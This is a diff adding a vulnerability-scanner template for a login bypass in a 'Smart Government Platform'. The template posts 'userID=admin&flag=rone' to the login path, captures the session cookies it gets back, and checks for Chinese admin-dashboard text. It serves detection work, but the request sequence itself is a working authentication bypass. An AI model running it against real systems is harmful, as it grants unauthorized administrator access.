@@ -1,0 +1,66 @@
+id: szt-smart-government-login-bypass
+
+info:
+  name: Smart Government Platform Login Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: auth-bypass
+  description: |
+    This template checks for login bypass vulnerability in the Smart Government Platform by exploiting session cookies.
+
+variables:
+  login_path: "/portal/default/login"
+  check_path: "/theme/concise"
+
+http:
+  - raw:
+      - |
+        POST {{BaseURL}}{{login_path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        userID=admin&flag=rone
+
+    extractors:
+      - type: regex
+        name: cookie1
+        part: header
+        regex:
+          - "GOASESSID=(.*?);"
+        internal: true
+      - type: regex
+        name: cookie2
+        part: header
+        regex:
+          - " (.*?); expires"
+        internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+          - ""
+        part: body
+
+  - raw:
+      - |
+        GET {{BaseURL}}{{check_path}} HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: "GOASESSID={{cookie1}};{{cookie2}}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "您好，系统管理员"
+          - "我在线上"
+          - "控制面板"
+          - "密码修改"
+          - "个人信息"
+        part: body
